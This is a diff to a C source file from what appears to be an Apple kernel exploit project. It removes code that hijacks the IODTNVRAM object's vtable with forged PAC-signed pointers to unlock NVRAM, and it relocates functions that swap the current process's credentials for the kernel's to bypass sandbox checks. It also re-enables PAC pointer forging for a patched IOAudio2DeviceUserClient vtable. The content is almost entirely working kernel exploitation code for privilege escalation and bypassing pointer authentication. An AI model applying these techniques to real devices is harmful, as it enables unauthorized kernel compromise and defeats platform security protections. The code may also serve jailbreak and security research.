@@ -6,17 +6,16 @@
 
 #include <assert.h>
 
-#include <malloc/_malloc.h>
-
 #include "IOKitLib.h"
 #include "kernel_call.h"
 #include "kc_parameters.h"
 #include "pac.h"
 #include "kernel_memory.h"
-#include "kernel_slide.h"
 #include "log.h"
 #include "mach_vm.h"
 #include "parameters.h"
+
+#include <malloc/_malloc.h>
 
 // ---- Global variables --------------------------------------------------------------------------
 
@@ -41,130 +40,6 @@ static const size_t max_vtable_size = 0x1000;
 // The user client's original vtable pointer.
 static uint64_t original_vtable;
 
-static uint64_t original_nvram_vtable = 0;
-static uint64_t fake_nvram_vtable = 0;
-static io_service_t IODTNVRAMSrv = MACH_PORT_NULL;
-
-// it always returns false
-const uint64_t searchNVRAMProperty = 0x590;
-// 0 corresponds to root only
-const uint64_t getOFVariablePerm = 0x558;
-
-// get kernel address of IODTNVRAM object
-uint64_t get_iodtnvram_obj(void) {
-  if (!MACH_PORT_VALID(IODTNVRAMSrv)) {
-    IODTNVRAMSrv = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IODTNVRAM"));
-  };
-  assert(MACH_PORT_VALID(IODTNVRAMSrv));
-  uint64_t nvram_up;
-  bool ok = kernel_ipc_port_lookup(current_task, IODTNVRAMSrv, &nvram_up, NULL);
-  assert(ok);
-  uint64_t IODTNVRAMObj = kernel_read64(nvram_up + OFFSET(ipc_port, ip_kobject));
-  return IODTNVRAMObj;
-}
-
-void unlocknvram(void) {
-  uint64_t obj = get_iodtnvram_obj();
-
-  original_nvram_vtable = kernel_read64(obj);
-  uint64_t vtable_xpac = kernel_xpacd(original_nvram_vtable);
-  // copy vtable to userspace
-  uint64_t *buf = calloc(1, max_vtable_size);
-  assert(buf);
-  DEBUG_TRACE(2, "nvram vtable at 0x%016llx (unslid: 0x%016llx)", vtable_xpac, vtable_xpac-kernel_slide);
-
-  kernel_read(vtable_xpac, buf, max_vtable_size);
-
-  /*
-  // bruteforce unknown types (too lazy for static analysys)
-  for (size_t i=0; i < max_vtable_size/sizeof(*buf); ++i) {
-    uint16_t type = 1;
-    if (i < VTABLE_PAC_CODES(IODTNVRAM).count) {
-      type = VTABLE_PAC_CODES(IODTNVRAM).codes[i];
-    }
-
-    uint64_t expected = buf[i];
-    if (expected == 0) {
-      break;
-    }
-    uint64_t ctx_addr = vtable_xpac + i * sizeof(*buf);
-    uint64_t addr = kernel_xpaci(expected);
-
-    uint64_t actual = 0;
-
-    while (type != 0) {
-      actual = kernel_forge_pacia_with_type(addr, ctx_addr, type);
-      if (actual == expected) {
-        break;
-      }
-      type++;
-    }
-    if (actual == expected) {
-      DEBUG_TRACE(1, "type for %03zu: 0x%04x", i, type);
-    } else {
-      DEBUG_TRACE(1, "type for %03zu:  FAIL ", i);
-    }
-  }
-  return free(buf);
-   */
-  // alter it
-  buf[getOFVariablePerm/sizeof(uint64_t)] = kernel_xpaci(buf[searchNVRAMProperty/sizeof(uint64_t)]);
-
-  // allocate buffer in kernel
-  kern_return_t kr = mach_vm_allocate(kernel_task_port, &fake_nvram_vtable,
-                                      kernel_buffer_size, VM_FLAGS_ANYWHERE);
-  if (kr != KERN_SUCCESS) {
-    ERROR("%s returned %d: %s", "mach_vm_allocate", kr, mach_error_string(kr));
-    ERROR("could not allocate kernel buffer");
-  }
-  DEBUG_TRACE(1, "allocated kernel buffer at 0x%016llx", fake_nvram_vtable);
-
-  // Forge the pacia pointers to the virtual methods.
-  size_t count = 0;
-  for (; count < max_vtable_size / sizeof(*buf); count++) {
-    uint64_t vmethod = buf[count];
-    if (vmethod == 0) {
-      break;
-    }
-//#if __arm64e__
-    assert(count < VTABLE_PAC_CODES(IODTNVRAM).count);
-//    DEBUG_TRACE(1, "for %03zu, current 0x%016llx, calculated 0x%016llx", count, vmethod,
-//                kernel_forge_pacia_with_type(kernel_xpaci(vmethod), vtable_xpac+count * sizeof(*buf),
-//                                             VTABLE_PAC_CODES(IODTNVRAM).codes[count]));
-    vmethod = kernel_xpaci(vmethod);
-    uint64_t vmethod_address = fake_nvram_vtable + count * sizeof(*buf);
-    buf[count] = kernel_forge_pacia_with_type(vmethod, vmethod_address,
-                                                 VTABLE_PAC_CODES(IODTNVRAM).codes[count]);
-//#endif // __arm64e__
-  }
-
-  // and copy it back
-  kernel_write(fake_nvram_vtable, buf, count*sizeof(*buf));
-  // replace vtable on IODTNVRAM object
-  kernel_write64(obj, kernel_forge_pacda(fake_nvram_vtable, 0));
-  free(buf);
-}
-
-void locknvram(void) {
-  if (fake_nvram_vtable == 0 || original_nvram_vtable == 0) return;
-
-  if (original_nvram_vtable != 0) {
-    uint64_t obj = get_iodtnvram_obj();
-    kernel_write64(obj, original_nvram_vtable);
-  }
-
-  if (fake_nvram_vtable != 0) {
-    mach_vm_deallocate(mach_task_self(), fake_nvram_vtable, kernel_buffer_size);
-    fake_nvram_vtable = 0;
-  }
-
-  if (MACH_PORT_VALID(IODTNVRAMSrv)) {
-    IOServiceClose(IODTNVRAMSrv);
-    IODTNVRAMSrv = MACH_PORT_NULL;
-  }
-}
-
-
 // ---- Stage 1 -----------------------------------------------------------------------------------
 
 /*
@@ -176,6 +51,37 @@ void locknvram(void) {
 static uint64_t
 kernel_get_proc_for_task(uint64_t task) {
 	return kernel_read64(task + OFFSET(task, bsd_info));
+}
+
+/*
+ * assume_kernel_credentials
+ *
+ * Description:
+ * 	Set this process's credentials to the kernel's credentials so that we can bypass sandbox
+ * 	checks.
+ */
+static void
+assume_kernel_credentials(uint64_t *ucred_field, uint64_t *ucred) {
+	uint64_t proc_self = kernel_get_proc_for_task(current_task);
+	uint64_t kernel_proc = kernel_get_proc_for_task(kernel_task);
+	uint64_t proc_self_ucred_field = proc_self + OFFSET(proc, p_ucred);
+	uint64_t kernel_proc_ucred_field = kernel_proc + OFFSET(proc, p_ucred);
+	uint64_t proc_self_ucred = kernel_read64(proc_self_ucred_field);
+	uint64_t kernel_proc_ucred = kernel_read64(kernel_proc_ucred_field);
+	kernel_write64(proc_self_ucred_field, kernel_proc_ucred);
+	*ucred_field = proc_self_ucred_field;
+	*ucred = proc_self_ucred;
+}
+
+/*
+ * restore_credentials
+ *
+ * Description:
+ * 	Restore this process's credentials after calling assume_kernel_credentials().
+ */
+static void
+restore_credentials(uint64_t ucred_field, uint64_t ucred) {
+	kernel_write64(ucred_field, ucred);
 }
 
 /*
@@ -329,13 +235,13 @@ stage2_patch_user_client_vtable(uint64_t *vtable) {
 		if (vmethod == 0) {
 			break;
 		}
-//#if __arm64e__
+#if __arm64e__
 		assert(count < VTABLE_PAC_CODES(IOAudio2DeviceUserClient).count);
 		vmethod = kernel_xpaci(vmethod);
 		uint64_t vmethod_address = kernel_buffer + count * sizeof(*vtable);
 		vtable[count] = kernel_forge_pacia_with_type(vmethod, vmethod_address,
 				VTABLE_PAC_CODES(IOAudio2DeviceUserClient).codes[count]);
-//#endif // __arm64e__
+#endif // __arm64e__
 	}
 	return count;
 }
@@ -468,22 +374,4 @@ stage3_kernel_call_deinit() {
 uint32_t
 kernel_call_7v(uint64_t function, size_t argument_count, const uint64_t arguments[]) {
 	return stage2_kernel_call_7v(function, argument_count, arguments);
-}
-
-void
-assume_kernel_credentials(uint64_t *ucred_field, uint64_t *ucred) {
-  uint64_t proc_self = kernel_get_proc_for_task(current_task);
-  uint64_t kernel_proc = kernel_get_proc_for_task(kernel_task);
-  uint64_t proc_self_ucred_field = proc_self + OFFSET(proc, p_ucred);
-  uint64_t kernel_proc_ucred_field = kernel_proc + OFFSET(proc, p_ucred);
-  uint64_t proc_self_ucred = kernel_read64(proc_self_ucred_field);
-  uint64_t kernel_proc_ucred = kernel_read64(kernel_proc_ucred_field);
-  kernel_write64(proc_self_ucred_field, kernel_proc_ucred);
-  *ucred_field = proc_self_ucred_field;
-  *ucred = proc_self_ucred;
-}
-
-void
-restore_credentials(uint64_t ucred_field, uint64_t ucred) {
-  kernel_write64(ucred_field, ucred);
 }
